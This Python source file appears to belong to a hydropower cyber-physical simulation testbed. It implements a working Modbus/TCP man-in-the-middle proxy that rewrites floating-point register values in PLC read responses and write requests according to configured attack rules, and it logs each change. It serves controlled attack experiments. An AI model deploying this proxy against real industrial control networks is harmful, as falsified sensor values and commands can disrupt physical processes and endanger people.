#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Configurable Modbus/TCP MITM proxy for controlled Hydro-CPS-Sim experiments.

The proxy is intentionally small and experiment-oriented: it preserves Modbus/TCP
transaction IDs while optionally modifying configured 32-bit REAL values in
read responses or write requests. It is launched by src.attack.launch inside an
attacker network namespace.
"""
from __future__ import annotations

import argparse
import csv
import json
import os
import signal
import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from src.core.config import load_runtime_config, load_yaml

BASE_MD_REGISTER = 2048


def float_to_registers(value: float) -> list[int]:
    raw = struct.pack(">f", float(value))
    return [int.from_bytes(raw[0:2], "big"), int.from_bytes(raw[2:4], "big")]


def registers_to_float(registers: list[int]) -> float:
    if len(registers) < 2:
        raise ValueError(f"Need at least 2 registers for REAL, got {len(registers)}")
    raw = int(registers[0]).to_bytes(2, "big") + int(registers[1]).to_bytes(2, "big")
    return struct.unpack(">f", raw)[0]

READ_HOLDING_REGISTERS = 3
READ_INPUT_REGISTERS = 4
WRITE_MULTIPLE_REGISTERS = 16

_STOP = False


def _install_signal_handlers() -> None:
    def _handler(signum, frame):  # type: ignore[no-untyped-def]
        global _STOP
        _STOP = True

    signal.signal(signal.SIGTERM, _handler)
    signal.signal(signal.SIGINT, _handler)


@dataclass
class AttackRule:
    name: str
    target: str
    variable: str
    direction: str
    operation: str
    value: float
    function_codes: set[int]
    start_after_sec: float = 0.0
    duration_sec: float | None = None
    max_events: int | None = None
    events: int = 0
    md_index: int | None = None
    register: int | None = None

    def active(self, elapsed: float) -> bool:
        if elapsed < self.start_after_sec:
            return False
        if self.duration_sec is not None and elapsed > self.start_after_sec + self.duration_sec:
            return False
        if self.max_events is not None and self.events >= self.max_events:
            return False
        return True

    def apply(self, original: float) -> float:
        op = self.operation.lower()
        if op in {"set", "replace"}:
            return float(self.value)
        if op in {"add", "offset", "bias"}:
            return float(original) + float(self.value)
        if op in {"multiply", "scale"}:
            return float(original) * float(self.value)
        raise ValueError(f"unsupported attack operation: {self.operation}")


@dataclass
class ConnectionState:
    pending_reads: dict[int, tuple[int, int, int]] = field(default_factory=dict)
    lock: threading.Lock = field(default_factory=threading.Lock)


class EventWriter:
    def __init__(self, path: Path):
        self.path = path
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self.lock = threading.Lock()
        self.columns = [
            "timestamp_epoch",
            "attack",
            "rule",
            "target",
            "iteration",
            "direction",
            "function_code",
            "transaction_id",
            "variable",
            "md_index",
            "register",
            "original_value",
            "modified_value",
            "client",
            "server",
        ]
        if not self.path.exists() or self.path.stat().st_size == 0:
            with self.path.open("w", newline="", encoding="utf-8") as f:
                csv.DictWriter(f, fieldnames=self.columns).writeheader()

    def write(self, row: dict[str, Any]) -> None:
        with self.lock:
            with self.path.open("a", newline="", encoding="utf-8") as f:
                writer = csv.DictWriter(f, fieldnames=self.columns, extrasaction="ignore")
                writer.writerow(row)


class AttackStateReader:
    """Read the coordinator-controlled MITM state file.

    The proxy stays in the TCP path for the whole run.  When this state says
    active=false, frames are forwarded unchanged; when active=true, matching
    rules may modify Modbus frames.
    """

    def __init__(self, path: Path | None, *, default_active: bool = True):
        self.path = path
        self.default_active = bool(default_active)
        self.active = bool(default_active)
        self.iteration: int | None = None
        self.reason = "default"
        self._mtime_ns: int | None = None
        self._last_reported: tuple[bool, int | None] | None = None
        self._lock = threading.Lock()

    def refresh(self) -> None:
        if self.path is None:
            return
        try:
            st = self.path.stat()
        except FileNotFoundError:
            with self._lock:
                self.active = False
                self.iteration = None
                self.reason = "state file missing"
            return
        if self._mtime_ns == st.st_mtime_ns:
            return
        try:
            payload = json.loads(self.path.read_text(encoding="utf-8"))
        except Exception as exc:
            print(f"[MITM][STATE][WARN] failed to read {self.path}: {exc}", flush=True)
            return
        with self._lock:
            self._mtime_ns = st.st_mtime_ns
            self.active = bool(payload.get("active", False))
            raw_iteration = payload.get("iteration")
            self.iteration = None if raw_iteration is None else int(raw_iteration)
            self.reason = str(payload.get("reason", ""))
            current = (self.active, self.iteration)
            if current != self._last_reported:
                mode = "attack" if self.active else "transparent"
                print(f"[MITM][STATE] mode={mode} iteration={self.iteration} reason={self.reason}", flush=True)
                self._last_reported = current

    def is_active(self) -> bool:
        self.refresh()
        with self._lock:
            return self.active

    def current_iteration(self) -> int | None:
        self.refresh()
        with self._lock:
            return self.iteration


class ModbusMitmProcessor:
    def __init__(self, *, attack_name: str, target: str, rules: list[AttackRule], events: EventWriter, state: AttackStateReader):
        self.attack_name = attack_name
        self.target = target.upper()
        self.rules = [r for r in rules if r.target.upper() == self.target]
        self.events = events
        self.state = state
        self.started = time.monotonic()

    def process(self, frame: bytes, direction: str, state: ConnectionState, client_label: str, server_label: str) -> bytes:
        if len(frame) < 8:
            return frame
        transaction_id = int.from_bytes(frame[0:2], "big")
        protocol_id = int.from_bytes(frame[2:4], "big")
        length = int.from_bytes(frame[4:6], "big")
        if protocol_id != 0 or length < 2 or len(frame) != 6 + length:
            return frame

        function_code = frame[7]
        if direction == "request":
            if function_code in {READ_HOLDING_REGISTERS, READ_INPUT_REGISTERS} and len(frame) >= 12:
                start_addr = int.from_bytes(frame[8:10], "big")
                quantity = int.from_bytes(frame[10:12], "big")
                with state.lock:
                    state.pending_reads[transaction_id] = (function_code, start_addr, quantity)
                return frame
            if function_code == WRITE_MULTIPLE_REGISTERS:
                return self._patch_write_multiple_request(frame, state, client_label, server_label)
            return frame

        if direction == "response" and function_code in {READ_HOLDING_REGISTERS, READ_INPUT_REGISTERS}:
            with state.lock:
                ctx = state.pending_reads.pop(transaction_id, None)
            if ctx is None:
                return frame
            _fc, start_addr, quantity = ctx
            return self._patch_read_response(frame, start_addr, quantity, client_label, server_label)
        return frame

    def _active_rules(self, *, direction: str, function_code: int) -> list[AttackRule]:
        if not self.state.is_active():
            return []
        elapsed = time.monotonic() - self.started
        result: list[AttackRule] = []
        for rule in self.rules:
            if rule.direction.lower() != direction:
                continue
            if function_code not in rule.function_codes:
                continue
            if rule.register is None:
                continue
            if rule.active(elapsed):
                result.append(rule)
        return result

    def _patch_read_response(self, frame: bytes, start_addr: int, quantity: int, client_label: str, server_label: str) -> bytes:
        if len(frame) < 9:
            return frame
        function_code = frame[7]
        byte_count = frame[8]
        if byte_count + 9 > len(frame):
            return frame
        data = bytearray(frame)
        rules = self._active_rules(direction="response", function_code=function_code)
        for rule in rules:
            assert rule.register is not None
            reg = rule.register
            # A REAL occupies two 16-bit registers.
            if not (start_addr <= reg and reg + 1 < start_addr + quantity):
                continue
            reg_offset = reg - start_addr
            byte_offset = 9 + reg_offset * 2
            if byte_offset + 4 > 9 + byte_count:
                continue
            old_regs = [
                int.from_bytes(data[byte_offset:byte_offset + 2], "big"),
                int.from_bytes(data[byte_offset + 2:byte_offset + 4], "big"),
            ]
            try:
                original = registers_to_float(old_regs)
                modified = rule.apply(original)
                new_regs = float_to_registers(modified)
            except Exception:
                continue
            data[byte_offset:byte_offset + 2] = int(new_regs[0]).to_bytes(2, "big")
            data[byte_offset + 2:byte_offset + 4] = int(new_regs[1]).to_bytes(2, "big")
            rule.events += 1
            self._log_event(rule, "response", function_code, int.from_bytes(frame[0:2], "big"), original, modified, client_label, server_label)
        return bytes(data)

    def _patch_write_multiple_request(self, frame: bytes, state: ConnectionState, client_label: str, server_label: str) -> bytes:
        if len(frame) < 13:
            return frame
        function_code = frame[7]
        start_addr = int.from_bytes(frame[8:10], "big")
        quantity = int.from_bytes(frame[10:12], "big")
        byte_count = frame[12]
        if 13 + byte_count > len(frame):
            return frame
        data = bytearray(frame)
        rules = self._active_rules(direction="request", function_code=function_code)
        for rule in rules:
            assert rule.register is not None
            reg = rule.register
            if not (start_addr <= reg and reg + 1 < start_addr + quantity):
                continue
            reg_offset = reg - start_addr
            byte_offset = 13 + reg_offset * 2
            if byte_offset + 4 > 13 + byte_count:
                continue
            old_regs = [
                int.from_bytes(data[byte_offset:byte_offset + 2], "big"),
                int.from_bytes(data[byte_offset + 2:byte_offset + 4], "big"),
            ]
            try:
                original = registers_to_float(old_regs)
                modified = rule.apply(original)
                new_regs = float_to_registers(modified)
            except Exception:
                continue
            data[byte_offset:byte_offset + 2] = int(new_regs[0]).to_bytes(2, "big")
            data[byte_offset + 2:byte_offset + 4] = int(new_regs[1]).to_bytes(2, "big")
            rule.events += 1
            self._log_event(rule, "request", function_code, int.from_bytes(frame[0:2], "big"), original, modified, client_label, server_label)
        return bytes(data)

    def _log_event(
        self,
        rule: AttackRule,
        direction: str,
        function_code: int,
        transaction_id: int,
        original: float,
        modified: float,
        client_label: str,
        server_label: str,
    ) -> None:
        self.events.write({
            "timestamp_epoch": f"{time.time():.6f}",
            "attack": self.attack_name,
            "rule": rule.name,
            "target": self.target,
            "iteration": self.state.current_iteration(),
            "direction": direction,
            "function_code": function_code,
            "transaction_id": transaction_id,
            "variable": rule.variable,
            "md_index": rule.md_index,
            "register": rule.register,
            "original_value": f"{original:.9g}",
            "modified_value": f"{modified:.9g}",
            "client": client_label,
            "server": server_label,
        })


class ModbusMitmServer:
    def __init__(self, args: argparse.Namespace, processor: ModbusMitmProcessor):
        self.args = args
        self.processor = processor
        self.listen_socket: socket.socket | None = None
        self.threads: list[threading.Thread] = []

    def serve_forever(self) -> None:
        self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listen_socket.bind((self.args.listen_host, self.args.listen_port))
        self.listen_socket.listen(64)
        self.listen_socket.settimeout(0.5)
        print(
            f"[MITM] listen {self.args.listen_host}:{self.args.listen_port} -> "
            f"{self.args.target_host}:{self.args.target_port} attack={self.args.attack} target={self.args.target}",
            flush=True,
        )
        while not _STOP:
            try:
                client_sock, client_addr = self.listen_socket.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            t = threading.Thread(target=self._handle_client, args=(client_sock, client_addr), daemon=True)
            t.start()
            self.threads.append(t)

    def close(self) -> None:
        try:
            if self.listen_socket is not None:
                self.listen_socket.close()
        except Exception:
            pass

    def _handle_client(self, client_sock: socket.socket, client_addr: tuple[str, int]) -> None:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_label = f"{client_addr[0]}:{client_addr[1]}"
        server_label = f"{self.args.target_host}:{self.args.target_port}"
        try:
            server_sock.settimeout(self.args.connect_timeout)
            server_sock.connect((self.args.target_host, self.args.target_port))
            server_sock.settimeout(None)
            client_sock.settimeout(None)
        except Exception as exc:
            print(f"[MITM][ERR] connect target {server_label}: {exc}", flush=True)
            try:
                client_sock.close()
            finally:
                server_sock.close()
            return

        state = ConnectionState()
        t1 = threading.Thread(target=self._pipe, args=(client_sock, server_sock, "request", state, client_label, server_label), daemon=True)
        t2 = threading.Thread(target=self._pipe, args=(server_sock, client_sock, "response", state, client_label, server_label), daemon=True)
        t1.start()
        t2.start()
        t1.join()
        t2.join()

    def _pipe(
        self,
        src: socket.socket,
        dst: socket.socket,
        direction: str,
        state: ConnectionState,
        client_label: str,
        server_label: str,
    ) -> None:
        buf = b""
        try:
            while not _STOP:
                chunk = src.recv(4096)
                if not chunk:
                    break
                buf += chunk
                while True:
                    if len(buf) < 7:
                        break
                    length = int.from_bytes(buf[4:6], "big")
                    total = 6 + length
                    if length < 2 or total > 260 + 7:
                        # Not a plausible Modbus/TCP ADU. Forward what we have.
                        dst.sendall(buf)
                        buf = b""
                        break
                    if len(buf) < total:
                        break
                    frame = buf[:total]
                    buf = buf[total:]
                    patched = self.processor.process(frame, direction, state, client_label, server_label)
                    dst.sendall(patched)
            if buf:
                dst.sendall(buf)
        except Exception as exc:
            print(f"[MITM][PIPE][{direction}] {exc}", flush=True)
        finally:
            for s in (src, dst):
                try:
                    s.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    s.close()
                except Exception:
                    pass


def _scenario_list(cfg: dict[str, Any]) -> list[dict[str, Any]]:
    attacks = cfg.get("attacks", {}) or {}
    if isinstance(attacks, list):
        return [x for x in attacks if isinstance(x, dict)]
    scenarios = attacks.get("scenarios", []) if isinstance(attacks, dict) else []
    return [x for x in scenarios if isinstance(x, dict)]


def _load_scenario(config_path: Path, attack_name: str) -> dict[str, Any]:
    cfg = load_yaml(config_path)
    for item in _scenario_list(cfg):
        if str(item.get("name", "")) == attack_name:
            return item
    raise ValueError(f"attack scenario not found: {attack_name}")


def _rule_function_codes(raw: Any, direction: str) -> set[int]:
    if raw is None:
        return {READ_HOLDING_REGISTERS, READ_INPUT_REGISTERS} if direction == "response" else {WRITE_MULTIPLE_REGISTERS}
    if isinstance(raw, int):
        return {int(raw)}
    return {int(x) for x in raw}


def _build_rules(config_path: Path, attack_name: str, target: str) -> list[AttackRule]:
    scenario = _load_scenario(config_path, attack_name)
    rt = load_runtime_config(config_path)
    target_key = target.upper()
    if target_key not in rt.plcs:
        raise ValueError(f"unknown target PLC in MITM config: {target}")
    plc = rt.plcs[target_key]
    result: list[AttackRule] = []
    for idx, raw in enumerate(scenario.get("rules", []) or []):
        if not isinstance(raw, dict):
            continue
        rule_target = str(raw.get("target", target_key)).upper()
        if rule_target != target_key:
            continue
        variable = str(raw.get("variable", "")).strip()
        if not variable:
            raise ValueError(f"attack rule #{idx} missing variable")
        if variable not in plc.md_vars:
            raise ValueError(f"variable {variable} is not a %MD variable on {target_key}")
        md_index = plc.md_vars[variable].md_index
        direction = str(raw.get("direction", "response")).lower()
        window = raw.get("window", {}) or {}
        if not isinstance(window, dict):
            window = {}
        rule = AttackRule(
            name=str(raw.get("name", f"rule_{idx}")),
            target=target_key,
            variable=variable,
            direction=direction,
            operation=str(raw.get("operation", "set")),
            value=float(raw.get("value", 0.0)),
            function_codes=_rule_function_codes(raw.get("function_codes"), direction),
            start_after_sec=float(window.get("start_after_sec", raw.get("start_after_sec", 0.0)) or 0.0),
            duration_sec=(None if window.get("duration_sec", raw.get("duration_sec")) is None else float(window.get("duration_sec", raw.get("duration_sec")))),
            max_events=(None if raw.get("max_events") is None else int(raw.get("max_events"))),
            md_index=md_index,
            register=BASE_MD_REGISTER + md_index * 2,
        )
        result.append(rule)
    return result


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Run a Modbus/TCP MITM proxy for Hydro-CPS-Sim")
    p.add_argument("--config", required=True, type=Path)
    p.add_argument("--attack", required=True)
    p.add_argument("--target", required=True)
    p.add_argument("--listen-host", required=True)
    p.add_argument("--listen-port", required=True, type=int)
    p.add_argument("--target-host", required=True)
    p.add_argument("--target-port", type=int, default=502)
    p.add_argument("--runtime-dir", required=True, type=Path)
    p.add_argument("--state-file", type=Path, default=None, help="Coordinator-written state file; active=false means transparent forwarding")
    p.add_argument("--connect-timeout", type=float, default=5.0)
    return p


def main() -> int:
    _install_signal_handlers()
    args = build_parser().parse_args()
    rules = _build_rules(args.config.resolve(), args.attack, args.target)
    event_path = args.runtime_dir / "csv" / "attack_events.csv"
    events = EventWriter(event_path)
    state = AttackStateReader(args.state_file, default_active=(args.state_file is None))
    state.refresh()
    processor = ModbusMitmProcessor(attack_name=args.attack, target=args.target, rules=rules, events=events, state=state)
    print(
        f"[MITM] loaded rules={len(rules)} events={event_path} "
        f"state={args.state_file or '<always-active>'} pid={os.getpid()}",
        flush=True,
    )
    server = ModbusMitmServer(args, processor)
    try:
        server.serve_forever()
    finally:
        server.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
